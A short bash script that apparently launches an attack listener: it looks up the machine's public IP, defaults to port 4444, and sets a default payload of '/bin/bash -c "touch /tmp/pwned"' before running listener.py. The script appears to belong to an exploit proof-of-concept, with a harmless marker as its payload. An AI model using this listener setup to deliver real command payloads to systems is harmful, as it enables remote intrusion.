#!/bin/bash

if [ -z $HOST ]; then
    HOST=$(curl -s http://ipv4.icanhazip.com)
fi

if [ -z $PORT ]; then
    PORT=4444
fi

if [ -z $DEFAULT_PAYLOAD ]; then
    DEFAULT_PAYLOAD="/bin/bash -c \"touch /tmp/pwned\""
fi

python3 listener.py --port="$PORT" --host="$HOST" --default-payload="$DEFAULT_PAYLOAD"